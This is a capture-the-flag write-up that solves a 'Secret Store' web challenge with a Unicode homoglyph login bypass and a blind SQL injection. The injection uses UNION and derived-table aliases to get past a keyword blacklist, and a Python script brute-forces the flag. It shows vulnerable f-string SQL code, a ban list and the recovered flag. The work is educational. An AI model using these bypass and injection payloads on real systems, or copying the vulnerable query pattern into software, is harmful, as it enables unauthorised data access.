## Secret Store  

This challenge involves a login bypass and an SQLi attack.  

The login page prompts us for a username, which we must set to `ADMIN` to gain access to the main page. However, there is a check that converts our input to lowercase and blocks `admin`.  

```python
@app.route("/login", methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')

        if username.lower() == "admin":
            username = ""

        username_upper = username.upper()
        
        if username_upper == 'ADMIN':
            session['user'] = username_upper
            return redirect(url_for('search'))
        else:
            return ("<p>Login failed</p>")
    
    return render_template("login.html")
```

We can easily bypass this using a homoglyph of `i`, as Python will use default case mappings to convert our input to uppercase. This ensures that our input bypasses the lowercase check while also succeeding the uppercase validation.  

In this case, I used the dotless `i` homoglyph.  

```
admın
```

After logging in as admin, we are redirected to the `/search` endpoint, where we are allowed to search for fruit products. We can immediately spot a blind SQLi vuln in the `SELECT` query.  

```python
@app.route("/search", methods=["GET", "POST"])
def search():
    if 'user' not in session or session['user'] != 'ADMIN':
        return jsonify({"error": "unauthorized"}), 401
    
    if request.method == "GET":
        return render_template("index.html")

    name = request.form.get("name", "")
    lowered = name.lower()
    
    for bad in banlist:
        if bad in lowered:
            name = ""
            break

    query = f"SELECT id, name, grade FROM gyul WHERE name = '{name}'"

    conn = get_db_connection()
    rows = conn.execute(query).fetchall()
    conn.close()

    exists = len(rows) > 0

    return jsonify({
        "exists": exists
    })
```

Looking at the database initialisation code, we can see another table `secretgyul`, which has a single entry containing the flag.  

However, the column name is randomly generated, so we can't directly access it.  

```python
secretname = os.urandom(32).hex()

cur.execute("""
CREATE TABLE IF NOT EXISTS gyul (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    grade INTEGER NOT NULL
);
""")

cur.execute(f"""
CREATE TABLE IF NOT EXISTS secretgyul (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    "{secretname}" TEXT NOT NULL,
    grade INTEGER NOT NULL
);
""")

cur.execute("INSERT INTO gyul (name, grade) VALUES ('orange', 2);")
cur.execute("INSERT INTO gyul (name, grade) VALUES ('gamgyul', 1);")
cur.execute("INSERT INTO gyul (name, grade) VALUES ('dekopon', 1);")
cur.execute(f"""
INSERT INTO secretgyul ("{secretname}", grade)
VALUES ('B1N4RY{{**redacted**}}', 1);
""")
```

Another thing to note is that the backend also implements a pretty restrictive blacklist to circumvent SQLi.  

```python
banlist = [
    '!', '"', '$', '%', '&', '+', '.', ':', '<', '>', '?', '@', '[', '\\', ']',
    '^', '_', '`', '|', '~',
    'alter', 'as', 'benchmark', 'case', 'count', 'create', 'cursor', 'database',
    'declare', 'delay', 'delete', 'describe', 'drop', 'exec', 'extract',
    'fetch','id','if', 'insert', 'lite', 'master', 'pragma', 'set', 'sleep', 'sql',
    'table', 'update', 'wait','grade','name'
]
```

Since `sql` and `lite` are blacklisted, we can't directly inspect the database structure using `sqlite_master`.  

Instead, we can try setting an alias for the `secretgyul` flag column, such that we can bruteforce it later on.  

We can use a `UNION` attack which combines the `gyul` and `secretgyul` entries into a single table, such that the name of the flag column is now `name` from `gyul`.  

```sql
' union select * from (select * from gyul UNION SELECT * FROM secretgyul) --
```

However, since `name` is blacklisted, we can use a derived table with `3` columns instead. The second column of our derived table will have the alias `a`, which we can use to reference the flag column.  

```sql
' union select * from (select * from ((select 1) join (select 2 a) join (select 3)) UNION SELECT * FROM secretgyul) --
```

Now that we have a way of extracting the flag column individually, we can then bruteforce the flag using blind SQLi.  

```python
charset = string.digits + string.ascii_letters + "!$&?@{}|~_"
flag = "B1N4RY{"

while not flag.endswith("}"):
    for char in charset:
        print("Trying:", char, '|', flag)

        payload = f"' union select * from (select * from ((select 1) join (select 2 a) join (select 3)) UNION SELECT * FROM secretgyul) where a glob '{flag}{char}*'--"

        res = s.post(f'{url}/search', headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={
            "name": payload
        })

        if res.json()["exists"]:
            flag += char
            break
```

Flag: `B1N4RY{0006159b48eac73d5d23ef05589f2f39}`